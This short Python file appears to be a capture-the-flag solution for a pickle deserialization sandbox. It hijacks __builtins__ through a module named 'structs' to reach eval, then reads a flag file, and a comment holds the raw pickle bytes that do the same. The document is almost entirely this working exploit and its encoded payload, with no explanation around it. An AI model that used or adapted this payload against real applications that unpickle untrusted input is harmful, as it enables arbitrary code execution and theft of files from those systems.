from structs import __dict__, __builtins__, __getattribute__

__dict__["structs"] = __builtins__
__builtins__['__import__'] = __getattribute__

from structs import get

a = get("eval")
a('print(open("./flag").read())')

# b'cstructs\n__dict__\np0\ncstructs\n__builtins__\np1\ncstructs\n__getattribute__\np2\ng0\n(Vstructs\ng1\nug1\n(V__import__\ng2\nucstructs\nget\np3\ng3\n(Veval\ntRp4\ng4\n(Vprint(open("./flag").read())\ntR.'
